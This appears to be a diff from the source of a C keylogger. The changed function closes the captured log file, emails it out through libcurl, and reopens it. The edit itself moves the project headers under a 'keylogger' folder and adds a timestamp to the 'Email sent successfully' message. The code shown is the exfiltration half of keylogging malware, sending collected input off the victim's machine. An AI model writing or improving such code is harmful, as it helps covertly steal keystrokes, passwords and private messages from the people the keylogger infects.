@@ -2,7 +2,9 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include "send_email.h"
+#include "utils/helpers.h"
+#include "keylogger/file_handler.h"
+#include "keylogger/send_email.h"
 
 
 #ifndef EMAIL_USERNAME
@@ -55,6 +57,7 @@ int EmailSender_init(EmailSender *sender) {
 
 int send_file_via_email(EmailSender *sender, FileHandler *fh) {
      CURLcode res = CURLE_OK;
+     char time_str[9];
 
     if (FileHandler_close(fh)) {
         fprintf(stderr, "Failed to close file before sending\n");
@@ -94,7 +97,8 @@ int send_file_via_email(EmailSender *sender, FileHandler *fh) {
     if (res != CURLE_OK) {
         fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
     } else {
-        printf("Email sent successfully\n");
+        get_current_time(time_str, sizeof(time_str));
+        printf("Email sent successfully: %s\n", time_str);
     }
 
     if (FileHandler_init(fh)) {
